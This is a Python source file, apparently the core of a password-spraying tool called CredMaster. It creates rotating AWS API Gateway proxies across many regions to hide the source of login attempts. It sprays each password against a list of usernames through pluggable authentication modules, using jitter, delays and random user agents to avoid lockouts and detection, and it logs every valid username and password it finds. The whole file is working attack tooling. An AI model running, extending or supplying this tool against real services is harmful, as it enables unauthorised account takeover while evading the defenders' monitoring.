#!/usr/bin/env python3
from concurrent.futures import ThreadPoolExecutor
from zipfile import *
from operator import itemgetter
from threading import Lock, Thread
import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
import boto3, argparse, importlib
from fire import FireProx

credentials = { 'accounts':[] }
apis = {}
regions = [
	'us-east-2', 'us-east-1','us-west-1','us-west-2','eu-west-3',
	'ap-northeast-1','ap-northeast-2','ap-south-1',
	'ap-southeast-1','ap-southeast-2','ca-central-1',
	'eu-central-1','eu-west-1','eu-west-2','sa-east-1',
]

lock = Lock()
q_spray = queue.Queue()
q_out = queue.Queue()
done = False

threads = []
outfile = None

start_time = None
end_time = None
time_lapse = None
results = []

def main(args,pargs):

	global start_time, end_time, time_lapse, apis, outfile, done

	thread_count = args.threads
	plugin = args.plugin
	username_file = args.userfile
	password_file = args.passwordfile
	profile_name = args.profile_name
	access_key = args.access_key
	secret_access_key = args.secret_access_key
	session_token = args.session_token
	useragent_file = args.useragentfile
	url = ""
	delay = args.delay
	outfile = args.outfile
	passwordsperdelay = args.passwordsperdelay
	jitter = args.jitter


	pluginargs = {}
	if len(pargs) % 2 == 1:
		pargs.append(None)
	for i in range(0,len(pargs)-1):
		key = pargs[i].replace("--","")
		pluginargs[key] = pargs[i+1]

	start_time = datetime.datetime.utcnow()
	log_entry('Execution started at: {}'.format(start_time))

	# Check with plugin to make sure it has the data that it needs
	validator = importlib.import_module('plugins.{}'.format(plugin))
	if getattr(validator,"validate",None) is not None:
		valid,errormsg,url = validator.validate(pluginargs, args)
		if not valid:
			log_entry(errormsg)
			return
	else:
		log_entry("No validate function found for plugin: {}".format(plugin))

	# Create lambdas based on thread count
	apis = load_apis(access_key, secret_access_key, profile_name, session_token, thread_count, url)

	# Print stats
	display_stats()

    #out_thread = threading.Thread(name="Thread-out", target=report, args=(out_q, output_file))

	log_entry("Starting Spray...")

	count = 0
	passwords = load_file(password_file)
	for password in passwords:

		load_credentials(username_file, password, useragent_file)

		# Start Spray
		with ThreadPoolExecutor(max_workers=len(apis)) as executor:
			for api_key in apis:
				#log_entry('Launching spray using {}...'.format())
				executor.submit(
					spray_thread,
					api_key = api_key,
					api_dict = apis[api_key],
					plugin = plugin,
					jitter = jitter
				)

		count = count + 1

		if delay == None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
			log_entry('Completed spray with password {} at {}'.format(password, datetime.datetime.utcnow()))
			continue
		elif count != passwordsperdelay:
			log_entry('Completed spray with password {} at {}, moving on to next password...'.format(password, datetime.datetime.utcnow()))
			continue
		else:
			log_entry('Completed spray with password {} at {}, sleeping for {} minutes before next password spray'.format(password, datetime.datetime.utcnow(), delay))
			log_entry('Valid credentials discovered: {}'.format(len(results)))
			for success in results:
				log_entry('Valid: {}:{}'.format(success['username'], success['password']))
			count = 0
			time.sleep(delay * 60)

	done = True

	# Capture duration
	end_time = datetime.datetime.utcnow()
	time_lapse = (end_time-start_time).total_seconds()

	# Remove AWS resources
	destroy_apis(access_key, secret_access_key, profile_name, session_token)

	# Print stats
	display_stats(False)


def load_apis(access_key, secret_access_key, profile_name, session_token, thread_count, url):
	threads = thread_count

	if thread_count > len(regions):
		threads = len(regions)

	log_entry('Creating {} API Gateways for {}'.format(threads, url))

	apis = {}

	# slow but multithreading this causes errors in boto3 for some reason :(
	for x in range(0,threads):
		apis[regions[x]] = create_api(access_key, secret_access_key, profile_name,	session_token, regions[x], url)
		log_entry('Created API - Region: {} ID: ({}) - {} => {}'.format(regions[x], apis[regions[x]]['api_gateway_id'], apis[regions[x]]['proxy_url'], url))

	return apis


def create_api(access_key, secret_access_key, profile_name, session_token, region, url):

	args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "create", region, url=url)
	fp = FireProx(args, help_str)
	resource_id, proxy_url = fp.create_api(url)
	return { "api_gateway_id" : resource_id, "proxy_url" : proxy_url }


def get_fireprox_args(access_key, secret_access_key, profile_name, session_token, command, region, url = None, api_id = None):

	args = {}
	args["access_key"] = access_key
	args["secret_access_key"] = secret_access_key
	args["url"] = url
	args["command"] = command
	args["region"] = region
	args["api_id"] = api_id
	args["profile_name"] = profile_name
	args["session_token"] = session_token

	help_str = "Error, inputs cause error."

	return args, help_str


def display_stats(start=True):
	if start:
		api_count = 0
		for lc, val in apis.items():
			if val:
				api_count += 1

		#log_entry('User/Password Combinations: {}'.format(len(credentials['accounts'])))
		log_entry('Total Regions Available: {}'.format(len(regions)))
		log_entry('Total API Gateways: {}'.format(api_count))


	if end_time and not start:
		log_entry('End Time: {}'.format(end_time))
		log_entry('Total Execution: {} seconds'.format(time_lapse))
		log_entry('Valid credentials identified: {}'.format(len(results)))

		for cred in results:
			log_entry('VALID - {}:{}'.format(cred['username'],cred['password']))


def destroy_apis(access_key, secret_access_key, profile_name, session_token):

	for api_key in apis:

		args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "delete", api_key, api_id = apis[api_key]['api_gateway_id'])
		fp = FireProx(args, help_str)
		log_entry('Destroying API ({}) in region {}'.format(args['api_id'], api_key))
		fp.delete_api(args["api_id"])


def spray_thread(api_key, api_dict, plugin, jitter=None):
	global results
	try:
		plugin_authentiate = getattr(importlib.import_module('plugins.{}.{}'.format(plugin, plugin)), '{}_authenticate'.format(plugin))
	except Exception as ex:
		log_entry("Error: Failed to import plugin with exception", thread_region=api_key)
		log_entry("Error: {}".format(ex), thread_region=api_key)
		exit()

	while not q_spray.empty():

		try:
			cred = q_spray.get_nowait()

			if jitter is not None:
				time.sleep(random.randint(0,jitter))

			response = plugin_authentiate(api_dict['proxy_url'], cred['username'], cred['password'], cred['useragent'])

			if not response['error']:
				log_entry("{}: {}".format(api_key,response['output']), thread_region=api_key)
			else:
				log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],response['output']), thread_region=api_key)

			if response['success']:
				results.append( {'username' : cred['username'], 'password' : cred['password']} )

			q_spray.task_done()
		except Exception as ex:
			log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],ex), thread_region=api_key)


def load_credentials(user_file, password, useragent_file=None):
	log_entry('Loading credentials from {} with password {}'.format(user_file, password))

	users = load_file(user_file)

	if useragent_file is not None:
		useragents = load_file(useragent_file)
	else:
		# randomly selected
		useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"]

	for user in users:
		cred = {}
		cred['username'] = user
		cred['password'] = password
		cred['useragent'] = random.choice(useragents)

		q_spray.put(cred)


def load_file(filename):
	if filename:
		return [line.strip() for line in open(filename, 'r')]


def log_entry(entry, thread_region=None):
	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
	print('[{}] {}'.format(ts, entry))

	if outfile is not None:
		if thread_region == None:
			with open(outfile + "-credmaster.txt", 'a+') as file:
				file.write('[{}] {}'.format(ts, entry))
				file.write('\n')
				file.close()
		else:
			with open(outfile + "-credmaster-" + thread_region + '.txt', 'a+') as file:
				file.write('[{}] {}'.format(ts, entry))
				file.write('\n')
				file.close()


if __name__ == '__main__':

	parser = argparse.ArgumentParser()
	parser.add_argument('--plugin', help='Spray plugin', required=True)
	parser.add_argument('-t', '--threads', type=int, default=1, help='Thread count (default: 1)')
	parser.add_argument('-u', '--userfile', required=True, help='Username file')
	parser.add_argument('-p', '--passwordfile', required=True, help='Password file')
	parser.add_argument('-a', '--useragentfile', required=False, help='Useragent file')
	parser.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents')
	parser.add_argument('-j', '--jitter', type=int, default=None, required=False, help='Jitter delay between requests in seconds (applies per-thread)')
	parser.add_argument('-d', '--delay', type=int, required=False, help='Delay between unique passwords, in minutes')
	parser.add_argument('--passwordsperdelay', type=int, default=1, required=False, help='Number of passwords to be tested per delay cycle')
	parser.add_argument('--profile_name', type=str, default=None, help='AWS Profile Name to store/retrieve credentials')
	parser.add_argument('--access_key', type=str, default=None, help='AWS Access Key')
	parser.add_argument('--secret_access_key', type=str, default=None, help='AWS Secret Access Key')
	parser.add_argument('--session_token', type=str, default=None, help='AWS Session Token')
	args,pluginargs = parser.parse_known_args()


	#if (not args.access_key or not args.secret_access_key):





	main(args,pluginargs)
